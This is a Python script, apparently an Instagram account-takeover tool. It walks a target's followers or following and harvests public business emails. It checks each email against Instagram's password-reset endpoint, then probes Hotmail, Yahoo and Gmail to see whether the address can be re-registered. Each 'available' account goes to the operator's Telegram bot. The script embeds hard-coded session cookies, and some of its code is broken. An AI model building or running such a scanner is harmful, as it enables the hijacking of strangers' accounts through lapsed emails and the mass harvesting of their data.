import requests , time,random
from json import dumps
r = requests.session()
slp = int(1)

print("""        By JOKER @t.uo
    _   _            _            _  
   | | | | __ _  ___| | _____  __| | 
   | |_| |/ _` |/ __| |/ / _ \/ _` | 
   |  _  | (_| | (__|   <  __/ (_| | 
   |_| |_|\__,_|\___|_|\_\___|\__,_| 
              IG ACCOUNT
Mode :
[1] Pull from followers
[2] Pull from following
[3] Exit the tool
""")
vv1ck = input('Enter mode : ')
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
time.sleep(1)


def hotmail():
	global foUS,foeml,foPOs,foFG,foFL,joker,ID,token
	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + foeml + "&_=1604288577990"
	data = ''
	headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
		
	html = r.get(url, data=data, headers=headers)
	
	if 'Neither' in html.text:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('Available HOTMAIL ✅')
		print(joker)
		r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=New account HOTMAIl:\n{joker}')
	
	else:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('Not Available HOTMAIL !')
		print(joker)


def yahoo():
	global foUS,foeml,foPOs,foFG,foFL,joker,ID,token
	url = 'https://login.yahoo.com/?.lang=en-US&src=homepage&.done=https%3A%2F%2Fwww.yahoo.com%2F&pspid=2023538075&activity=ybar-signin'
	
	headers = {
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
		'Connection': 'keep-alive',
		'Content-Length': '1407',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Cookie': 'B=82rv0jpg5pvrj&b=3&s=ih; GUC=AQEBAQFgXlBgZkIesgS7; A1=d=AQABBHP_XGACECWDyDdUXHkboH81-57gb4EFEgEBAQFQXmBmYAAAAAAA_eMAAAcIc_9cYJ7gb4E&S=AQAAApalUe79FFlRp7ovfQJ2MiU; A1S=d=AQABBHP_XGACECWDyDdUXHkboH81-57gb4EFEgEBAQFQXmBmYAAAAAAA_eMAAAcIc_9cYJ7gb4E&S=AQAAApalUe79FFlRp7ovfQJ2MiU&j=US; A3=d=AQABBHP_XGACECWDyDdUXHkboH81-57gb4EFEgEBAQFQXmBmYAAAAAAA_eMAAAcIc_9cYJ7gb4E&S=AQAAApalUe79FFlRp7ovfQJ2MiU; APID=UP5c8ac75b-9059-11eb-9dbf-0e2aa1c532a9; cmp=t=1617004634&j=0; AS=v=1&s=A0ANT8B2&d=B6062dcd7|oNvumWj.2SpXy9eyGGxMlejjTEIsf1Y9FT8b.dRBbLU6tEwWvsKaffvB.4kkbY8v1o47Hujfqwmca_3QPDfbsmOyVl7rnhXAMAJY_upKGp2zvmFMEJetWuhbK8lnZ9BqENsq2fPvrXYPoda8bwOb54mHNyjCJqbXuJML.QabkkEl8q_HQ.RIboW2AYcI6RyowJuK8WwOhBALFvlw_osLWQhvNvWSIeTpqHihEA.lGAqs3Yf4QhMKgDCxCqxxycqEhtMh7ugYgDRhZdq6p0Y7TS.JSgG7vNsVS57ZF27ggsq5QfTEl0oTFYmfpv3qQDUVfAQCAEcpRwQ8KTj3tstYC2QvHYM1meiRU0dWPlhWExGYiiUe0x_vq6cGeeI.6xNy1TvFMWifW2Ixz_zo0mG6yeKmqPcHPg.J5ddCJSygt9H_Ku6SbDQW_JEeWL8yRN_Z2bBQprZ3iggHThTIMa7rTrCkyNx5kfTN8ItUbs5fciTwUTH9rDjUXs9bUBQnbxCzFI6Cf3ccvyxO7ljbkqidAs0FGMiaxs0ZIqlSKjnotbAfmK5Q_y7UFo1fAxxuWOtusdleTWm4qw49NJiR8M4WdQPn1QK3x_1wc4_l.El5hSo2giZ9khvh5rXhGe7t25DSw6YfiTgBrFCHczNzNJFKNVRGriLVs5tchKoTzSgaV_XjYGG3D.Ke2TpmHOHFo.hJMpGoE5Jhd34zIwbKui12npscOaw5TuwhgClkUZ9o7LZitnZ3JO_JUSyImj6i23tFiHEWN_TGrGoECu9we3WrwCSoCmV1KY99fh5XXqxI8c4tPIRd3E4c7WU5q0tA9n5aBIk7LLZ8QvsaIZPRf39vBVInWB440DQ1XkiLvS64i1k0sAEvTR.rmHZ7z.E7JiEqD1LhTcjLkb_rdOIleuR4V9t942vSx3iE76vK7H06wu8-~A; APIDTS=1617005401',
		'Host': 'login.yahoo.com',
		'Origin': 'https://login.yahoo.com',
		'Referer': 'https://login.yahoo.com/?.lang=en-US&src=homepage&.done=https%3A%2F%2Fwww.yahoo.com%2F&pspid=2023538075&activity=ybar-signin',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-origin',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'X-Requested-With': 'XMLHttpRequest'}
			
	data = {
		'browser-fp-data': {
			"language":"ar",
			"colorDepth":24,
			"deviceMemory":8,
			"pixelRatio":1,
			"hardwareConcurrency":4,
			"timezoneOffset":0,
			"timezone":"UTC",
			"sessionStorage":1,
			"localStorage":1,
			"indexedDb":1,"openDatabase":1,
			"cpuClass":"unknown",
			"platform":"Win32",
			"doNotTrack":"unknown",
			"plugins":{"count":3,
			"hash":"7b56340f14f5478984860c0147f7b60c"},
			"canvas":"canvas winding:yes~canvas",
			"webgl":1,
			"webglVendorAndRenderer":"Google Inc.~Google SwiftShader",
			"adBlock":0,
			"hasLiedLanguages":0,
			"hasLiedResolution":0,
			"hasLiedOs":1,
			"hasLiedBrowser":0,
			"touchSupport":{"points":10,
			"event":0,"start":0},
			"fonts":{"count":33,
			"hash":"edeefd360161b4bf944ac045e41d0b21"},
			"audio":"124.04347527516074",
			"resolution":{"w":"1456","h":"818"},
			"availableResolution":{"w":"778","h":"1456"},
			"ts":{"serve":1617005399566,"render":1617005400737}},
		'crumb': 'n1oW5BIMSGb',
		'acrumb': 'A0ANT8B2',
		'sessionIndex': 'Qg--',
		'displayName': '',
		'deviceCapability': '{"pa":{"status":false}}',
		'username': 'mohamed@yahoo.com',
		'passwd': 'shgihfydse',
		'signin': 'Next',
		'persistent': 'y'}
	
	ok = r.post(url,headers=headers,data=data).text
	
	if '"errorMsg"' in ok:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('\nAvailable YAHOO ✅')
		print(joker)
		r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=New account HOTMAIl:\n{joker}')
	
	elif '"location"' in ok:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('Not Available YAHOO!')
		print(joker)

def gmail():
	global foUS,foeml,foPOs,foFG,foFL,joker,ID,token
	
	url = 'https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=32589&rt=j'
	
	headers = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '3911',
		'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		'cookie': 'OGPC=422038528-2:; SID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_cFdWBefOdFWBrRatzQzoTw.; __Secure-3PSID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_LWBgOEuV0LWH29_CLb3l1g.; HSID=A8KaTqMCOG6xpfvsz; SSID=AtYd81IgyZuE9EbfE; APISID=E3Psm5Uangi4fH9M/AkOnPYEUZWnD-tnA_; SAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; __Secure-3PAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; ACCOUNT_CHOOSER=AFx_qI6QfbFWoV6PV6XKN_T6BDu29QAEvMrEZsoAl1r4bDBfnWApbNKbPlRCbFUWBfZ_IufZlpgrXPJIQyLZtlrdzhTBLG1ugbS2CJ2q9HNMMkzfgeaXgctISpVwNdXddAWu4ZnL0x6TC4OCJGrmngsaE5GSmcovCQ; LSID=o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6lsMzh7eIoJ7jRz_OOQU1DQ.; SEARCH_SAMESITE=CgQImZIB; __Host-3PLSID=doritos|o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6ByLMNjL9oNzA97kBg7BANg.; 1P_JAR=2021-03-29-09; NID=212=i268DCPkYi3AzR0f25yIGeJwDvI9KnX0IkpB6-jLiMgIkylu-ok0FxsNwgb77pnNf9P1dRbBa0rwmwoo3rBZLPEqBaYbIUTYOqnGXlodQyFP6PiO7x1DARyLyIg2nH_J_J208rXWq1sLL7oP_YSeJFznofwfpsHamypEYMgwPx2rU9UJJ59txYOFOliHngVgrmyLeujCj_dKNV8hrTJDFTTVfnxZG68C; __Host-GAPS=1:BWYU84SbcmvuPTxMnLb_Bw1WhSze11euoEbasRquyke84p3z6kKhM4STn2l2KqDaXmLnjmuLAu5YjxpgPYYS2MAbFJoYEA:8QsfUKnQPG8GNFFh; SIDCC=AJi4QfGikn_BfUsmrNc_AQgbrwCzKzaBTYlqHvZ_vt7pRS98qOGuitJ1M1_khzvPELS_owtDIQ; __Secure-3PSIDCC=AJi4QfH3OD5jfNAacCFyT0_heunei0GLdQymhUmRU8zPB7R7Svse8_GiuWLuXbaSblXAYlq-7bU',
		'google-accounts-xsrf': '1',
		'origin': 'https://accounts.google.com',
		'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM&flowName=GlifWebSignIn&flowEntry=AddSession',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=eaa94017-90e6-4761-a779-143e63ce180a,sync_account_id=116486990055578668701,signin_mode=all_accounts,signout_mode=show_confirmation',
		'x-client-data': 'CJa2yQEIo7bJAQjEtskBCKmdygEIlqzKAQiIucoBCIbCygEI+MfKAQjx6soBCLGaywEI1JzLAQjjnMsBCKmdywEY4ZrLAQ==',
		'Decoded':
		'message ClientVariations {// Active client experiment variation IDs. repeated int32 variation_id = [3300118, 3300131, 3300164, 3313321, 3315222, 3316872, 3318022, 3318776, 3323249, 3329329, 3329620, 3329635, 3329705]; // Active client experiment variation IDs that trigger server-side behavior. repeated int32 trigger_variation_id = [3329377];}',
		'x-same-domain': '1' }
	
	data = {
		'continue': 'https://adssettings.google.com/authenticated?ref=yt_auth&pli=1',
		'f.req': f'["{foeml}","AEThLlw6VGsyn2_pe-f86vgMSUv6HW6cl7s3ftZAG2KM59m7HtlMteSbiMd1cXodMV9ao2r-etLvEFwNOT1gmDeaWFo3pqVs2c8soJREt0Nt6O_RSxudYIUsivz-edV1f8qX-zBOsY7YMWaow-mczgAPFsOkLBibmlmgwm2DK_Mq4qKUpR1tG4YpAzApopzlBEgFAymMMus8",[],null,"US",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{foeml}",null,null,null,true,true,[]]',
		'bgRequest': '["identifier","!XV6lXhPNAAY7smA8O7JCzxWNYzZtiS87ACkAIwj8RuOTLVLxGJigVpDhaC2z7ynSG4_C6vg2kxXAWOp26z7eH2IZogIAAAB9UgAAAB5oAQeZBBMPBNZpIQ75l0BgkmrzBFCvhfOdp8Lin14ikTnA1WsoaIfdlfYG6MYQnjc1UrPRJa74ZxDpu1BFftPI0nN7EOnM4ZS18dsZejZRwZBLtKG8QP0Q-GJEOZbq2-r2fqHe3GZb5Z7NW4rUeCLKfwsV7Tb8fuzfYlpZ_40Mw5S4Gk1C7BL4MOhtd3GE_62Qp-RuqLoqIvv5XIqMbLq6v0PjY6cUg5wg3cN4n3dF26kVWJYtS8vpVd5kBtydVCgidSNhN4ARi9Lk5TocNbPYonI5sm-7sJ0UGHI7wT4OFXJeKK_FgVxjXWI2FpFSrEPhgZahdfMB94LMNK-8eMIJKLTR-eOtu6l6TB3KVZEthoN_M0pvQHPcfAhLb0EB5tfkrcdZiMhOCGIZuCBmjzkog2_DV0Mw8Im5hMuTm8qrmX7i-lzWEmuuuYW5FGKDUraHZ0A0EmvWRaw7uMII2ScdpcXWUI6JGEjZYgGmOoTgMWVmUU0HTKuwLYkJvYxV89EdOjdtEjqfnlEl9WC21RfSxIt3mMkr9orJdP4opSk6neVuFTvvRD53NZ9iNboauX0Epe0IFa6NvidBSHLXIiaC92VUeNE08EaGEMXcy45ffg2BYsxmyu4DWRIoPcr0t1IrWdhwc1srOguxWl0mBs6QYeyLBc4CNRVglRFm3nklWlIE31g8GahYNLQnAxeljgp_WKEXda5VQm6WkDGcYGPbRf3bfxYqbJircIPhcOEYXzk8BQ9gJq9i3t3zX3qFg9U9B3skBRK4JgGKwzVWGjrw6K5G9uIOFsmXdPq7pdQE_tQ-PMPkuUPNoIZb98lu6reUbBEDHWfnpaiY6tjtTg0fcQW0kzrUN5kwJz7L47KpDYij4K3Y-hWN4vXJAFrbAHazlYZ4THHYrQDxeITF0MP6vweiyoful6H_YArrwliPX_7kswLE1MYOR_i5KwYlJEi9dMz1nSzyRynLSthBsez-zQYhlbt5Xhi8NuL3dRMxM8zRj2yw71sYdKjsX_AvNz0JX0v6W6eQSv6pVwyNAscdFsBcNt2N3xvwy0YUiFwIud5ypZe_MeWd8aByk4cce21tpZN8FDa4j6b2CGXPVpaVC7IZjCh0h_cXfFPoNONzD9roDpmOKzCrTj_q6xNPhtwY8vWdTV0CaJJbcm_ra3rp3FF0x6Hws5KZl9KpeRanphhtuiT90e-49V2AYdmbdlXgtZqJBswKwOOZhYUcw_33Q8t27ZXtiKxW2ieUv3fwvJ9Dz8l9pttsavtYUZ_mX6mN-PU4orT89JgeUDqimD91YI6Yx7KyoYlRbe7hYWNMzo0RAuuoElDr6GyTgf7pZC67XYQKm3-J3Obuja9iac7IeN7KaScI7uGcFV9gNhvP8j6evm9zws5Dlw"]',
		'at': 'AFoagUW_q8bXR45ZgAOS4A5fq9dVpQpMBQ:1617008567951',
		'azt': 'AFoagUW9q50Z3AnyfPsppwG7DjGdRvSUMQ:1617008567952',
		'cookiesDisabled': 'false',
		'deviceinfo': '[null,null,null,[],null,"US",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,2,null,false]',
		'gmscoreversion': 'undefined',
		'checkConnection': 'youtube:142:0',
		'checkedDomains': 'youtube',
		'pstMsg': '1'}

	ok = r.post(url,headers=headers,data=data).text
	
	if '["e",3,null,null,439]' in ok:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('\nAvailable GMAIL ✅')
		print(joker)
		r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=New account GMAIL:\n{joker}')

	elif '["e",3,null,null,417]' in ok:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('\nAvailable GMAIL ✅')
		print(joker)
		r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=New account GMAIL:\n{joker}')
	
	elif '["e",3,null,null,557]' in ok:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('Not Available GMAIL !')
		print(joker)
	
	else:
		pass

def rest():
	global foeml

	PROXY = {"https":run,"http":run}
	url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
	
	headers = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '95',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=WTmjI1945KEE4S356XwiCKGQxXP9EGZL',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/password/reset/',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-csrftoken': 'WTmjI1945KEE4S356XwiCKGQxXP9EGZL',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4',
		'x-instagram-ajax': '753ce878cd6d',
		'x-requested-with': 'XMLHttpRequest'}
	
	data = {
		'email_or_username': foeml,
		'recaptcha_challenge_field': '',
		'flow': '',
		'app_id': ''}
	
	go = r.post(url,headers=headers,data=data).text
	
	if '"status":"ok"' in go:
		if "gmail" in foeml:
			gmail()
		elif "hotmail" in foeml:
			hotmail()
		elif "yahoo" in foeml:
			yahoo()
		else:
			print(foeml)
	
	elif '"message":"No users found"' in go:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('A fake email is not used')
	
	elif '"Please wait a few minutes before you try again."' in go:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		print('You have been banned !')
	

def getINF():
	global foID,go,foUS,foeml,foPOs,foFG,foFL,joker
	cook = go.cookies['sessionid']
	
	urGT = 'https://i.instagram.com/api/v1/users/{}/info/'.format(foID)
	
	headGT = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+cook,
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	'sec-ch-ua-mobile': '?0',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4'}
	
	do = r.get(urGT,headers=headGT)
	
	if 'public_email' in do.text:
		foeml = str(do.json()['user']['public_email'])
		
		foUS = str(do.json()['user']['username'])
		
		foFL = str(do.json()['user']['follower_count'])
		
		foFG = str(do.json()['user']['following_count'])
		
		foPOs = str(do.json()['user']['media_count'])
		
		joker = 'Email: '+foeml+'\nUsername: '+foUS+'\nFollowers: '+foFL+'\nFollowing: '+foFG+'\nPost: '+foPOs
		
		if foeml == '':
			pass
			
		else:
			rest()
	else:
		print('━━━━━━━━━━━━━━━━━━━━━━━')
		foUS = str(do.json()['user']['username'])
		
		print('Account is not a business >> '+foUS)

def userID2():
	global go , foID , iid 
	j = 0
	while True:
		cook = go.cookies['sessionid']
		tok = 'd04b0a864b4b54837c0d870b0e77e076'
		
		cookies = {
		"sessionid": cook,}
		
		variables = {
			"id": iid,
			"first": 50}
		
		params = {
			"query_hash": tok,
			"variables": dumps(variables)}
		time.sleep(slp)
		ok = r.get("https://www.instagram.com/graphql/query/", params = params, cookies = cookies)
		if 'blocked_by_viewer: false' in ok.text:
			print('برايفت القواد')
			pass
		else:
			try:
				foID = str(ok.json()['data']['user']['edge_follow']['edges'][j]['node']['id'])
				
				j += 1
				getINF()
			except KeyError:
				print('stop ❤️')
				exit()
		
def usID2():
	global go , iid , target
	sis = go.cookies['sessionid']
	ur = 'https://www.instagram.com/{}/?__a=1'.format(target)
	
	hedID = {
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	'cache-control': 'no-cache',
	'cookie': 'ig_did=D5BC7E80-9785-4758-B94C-E128617D353B; mid=XsL1CAAAAAG9iRyIP2cLrfuZ7CUm; fbm_124024574287414=base_domain=.instagram.com; ig_nrcb=1; datr=9D0-YLR0rApS9iOG6npp3drV; shbid=489; shbts=1616344547.8202462; rur=ASH; csrftoken=origpnsxJ21mHIJCxkuOltceXsKKhTA2; ds_user_id=45572593982; sessionid='+sis,
	'pragma': 'no-cache',
	'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	'sec-ch-ua-mobile': '?0',
	'sec-fetch-dest': 'document',
	'sec-fetch-mode': 'navigate',
	'sec-fetch-site': 'cross-site',
	'sec-fetch-user': '?1',
	'upgrade-insecure-requests': '1',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'}
	
	id = requests.get(ur,headers=hedID)
	iid = id.json()['graphql']['user']['id']
	userID2()


foll= 0
def userID():
	global go , foID , iid ,count_followers
	
	while True:
		cook = go.cookies['sessionid']
		tok = 'c76146de99bb02f6415203be841dd25a'
		
		cookies = {
		"sessionid": cook,}
		
		variables = {
			"id": iid,
			"first": 50}
		
		params = {
			"query_hash": tok,
			"variables": dumps(variables)}
		time.sleep(slp)
		ok = r.get("https://www.instagram.com/graphql/query/", params = params, cookies = cookies)
		
		foI = ok.json()['data']['user']['edge_followed_by']['edges'][foll]['node']['id']
		getINF()
		foll +=1
				#exit()
	
		
def usID():
	global go , iid , target
	sis = go.cookies['sessionid']
	ur = 'https://www.instagram.com/{}/?__a=1'.format(target)
	
	hedID = {
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	'cache-control': 'no-cache',
	'cookie': 'ig_did=D5BC7E80-9785-4758-B94C-E128617D353B; mid=XsL1CAAAAAG9iRyIP2cLrfuZ7CUm; fbm_124024574287414=base_domain=.instagram.com; ig_nrcb=1; datr=9D0-YLR0rApS9iOG6npp3drV; shbid=489; shbts=1616344547.8202462; rur=ASH; csrftoken=origpnsxJ21mHIJCxkuOltceXsKKhTA2; ds_user_id=45572593982; sessionid='+sis,
	'pragma': 'no-cache',
	'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	'sec-ch-ua-mobile': '?0',
	'sec-fetch-dest': 'document',
	'sec-fetch-mode': 'navigate',
	'sec-fetch-site': 'cross-site',
	'sec-fetch-user': '?1',
	'upgrade-insecure-requests': '1',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'}
	
	id = requests.get(ur,headers=hedID)
	iid = id.json()['graphql']['user']['id']
	userID()


def login():
	global headLG ,go,datLG,slp,target,ID,token
	if vv1ck == '1':
		user = input('Enter user : ')
		pess = input('Enters pass : ')
		ID = input('Enter your id : ')
		token = input('Enter token bot : ')
		pass
	elif vv1ck == '2':
		user = input('Enter user : ')
		pess = input('Enters pass : ')
		ID = input('Enter your id : ')
		token = input('Enter token bot : ')
		pass
	else:
		print('\n\t\t\t>>>>> Good-bye <<<<<')
		print('\t\t insta: t.uo | tele: vv1ck')
		exit()
	urLG = "https://www.instagram.com/accounts/login/ajax/"
	headLG = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en-US,en;q=0.9',
		'content-length': '272',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; shbid=6144; shbts=1614374582.8963153',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/login/',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': '0',
		'x-instagram-ajax': '790551e77c76',
		'x-requested-with': 'XMLHttpRequest'}
	
	datLG = {
		"username": user,
		"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{pess}",
		"queryParams": "{}",
		"optIntoOneTap": "false"}
	
	go = r.post(urLG,headers=headLG,data=datLG)
	
	if ("userId") in go.text:
		print(f'[+] Hello {user} | Done login')
		if vv1ck == '1':
			target = input('Enter the target account name: ')
			usID()
		elif vv1ck == '2':
			target = input('Enter the target account name: ')
			usID2()
		
	elif ("two_factor") in go.text:
		print('\n Binary verification \n')
		
	elif ("checkpoint_url")  in go.text:
		print('\n Account Secure \n')
		
	else:
		print('\nThe username or password is wrong ! \n')
login()
